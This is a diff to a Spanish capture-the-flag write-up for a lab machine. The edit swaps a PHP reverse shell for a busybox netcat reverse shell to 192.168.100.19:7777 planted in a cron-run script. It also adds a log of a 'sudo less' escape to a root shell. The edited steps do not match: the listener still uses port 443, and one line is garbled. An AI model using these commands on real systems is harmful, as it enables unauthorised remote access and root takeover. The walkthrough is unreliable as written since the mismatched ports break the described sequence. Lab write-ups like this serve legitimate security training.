@@ -163,10 +163,11 @@ Se monitorea la ejecución del script con `pspy64`:
 🔹 **UID 1003** corresponde al usuario `investigador`.
 
 **Explotación:**
-1. Se reemplaza `procesar_datos.sh` con una **reverse shell en PHP**:
+1. Se reemplaza rm `procesar_datos.sh` con una **reverse shell en PHP**:
    ```bash
-   php -r '$sock=fsockopen("10.0.2.3",443);exec("sh <&3 >&3 2>&3");'
+   echo -e '#!/bin/bash\nbusybox nc 192.168.100.19 7777 -e sh' > procesar_datos.sh
    ```
+   chmod +x procesar_datos.sh y ponerse en la escucha
 2. Se inicia un listener en la máquina atacante:
    ```bash
    nc -nlvp 443
@@ -174,7 +175,20 @@ Se monitorea la ejecución del script con `pspy64`:
 3. Tras la ejecución del script, se obtiene una shell como `investigador`.
 
 ---
+```bash
+antes de intentar escalar privilegios tratar la tty
+investigador@TheHackersLabs-NaveNodriza:~$ sudo /usr/bin/less /etc/hosts
+comando sudo /usr/bin/less /etc/hosts !/bin/bash 
+sudo: unable to resolve host TheHackersLabs-NaveNodriza: Nombre o servicio desconocido
+!/bin/bash
+root@TheHackersLabs-NaveNodriza:/home/investigador# ls
+CAPITULO_3.txt  testt00001.txt  testt00001.xcf
+root@TheHackersLabs-NaveNodriza:/home/investigador# whoami
+root
+root@TheHackersLabs-NaveNodriza:/home/investigador# cd /root
+root@TheHackersLabs-NaveNodriza:~# cat *
 
+```
 ### 👑 Root
 
 Se revisan los permisos `sudo` del usuario `investigador`:
